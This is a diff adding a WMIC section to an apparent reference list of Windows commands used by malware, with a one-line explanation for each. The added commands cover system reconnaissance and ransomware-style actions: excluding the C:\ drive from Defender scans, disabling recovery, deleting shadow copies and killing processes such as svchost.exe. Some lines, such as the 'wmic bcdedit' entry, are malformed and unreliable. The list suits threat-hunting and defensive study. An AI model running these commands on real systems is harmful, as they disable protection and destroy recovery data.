@@ -77,3 +77,37 @@ nltest /DCList:%DCNAME%
 `echo %PATH%`
 
 ---
+
+## WMIC
+This tells them the system’s language and region settings (e.g., en-US, ru-RU, etc.). Some malware avoids executing in certain regions to stay under the radar  
+`wmic os get locale`
+
+Grabs a unique hardware ID that helps detect if the malware is running in a virtual machine (a common analysis environment)  
+`wmic csproduct get uuid`
+
+Returns the OS version (e.g., Windows 10 Pro), which helps decide if the system is a viable target  
+`wmic os get Caption`
+
+This installs a product key on the system, usually a routine action  
+`wmic path SoftwareLicensingService call InstallProductKey`
+
+This command triggers a license check on the system, another behavior that can either reinforce the disguise or quietly collect status data  
+`wmic call RefreshLicenseStatus`
+
+This command tells Windows Defender to exclude the entire C:\ drive from scans  
+`wmic /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=”C:\” `
+
+This disables the Windows recovery environment entirely, preventing the system from launching recovery tools during startup  
+`wmic bcdedit /set {default} recoveryenabled no`
+
+Silently deletes all existing shadow copies  
+`vssadmin delete shadows /all /quiet`
+
+Another method to remove previous restore points that users could use to roll back encrypted files  
+`wmic shadowcopy delete`
+
+This command attempts to terminate a running process, any process it has permission to kill  
+`wmic process call terminate`
+
+`wmic process where “name=’svchost.exe'” call terminate`
+
